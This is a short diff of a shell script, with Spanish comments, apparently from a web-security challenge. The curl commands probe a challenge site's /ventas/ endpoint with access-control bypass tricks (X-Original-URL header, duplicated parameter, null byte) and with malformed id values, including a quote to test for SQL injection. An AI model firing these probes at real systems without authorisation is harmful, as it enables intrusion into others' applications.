@@ -45,3 +45,16 @@ curl -s -X POST "$U"                                  # cambiar el método
 curl -s -H "X-Original-URL: /ventas/?id=1" "$U"       # header de bypass
 curl -s "$U&id=1"                                      # duplicar el parámetro
 curl -s "${U}%00"                                      # null byte
+
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+echo "=== id=1 (daba Forbidden) ==="; curl -s "$BASE?id=1"
+echo; echo "=== id=2 (daba Not found) ==="; curl -s "$BASE?id=2"
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+curl -s "$BASE?id=abc"      # id no numérico
+curl -s "$BASE?id="         # id vacío
+curl -s "$BASE?id[]=1"      # id como array
+curl -s "$BASE?id=1'"       # comilla, por si hay SQL detrás
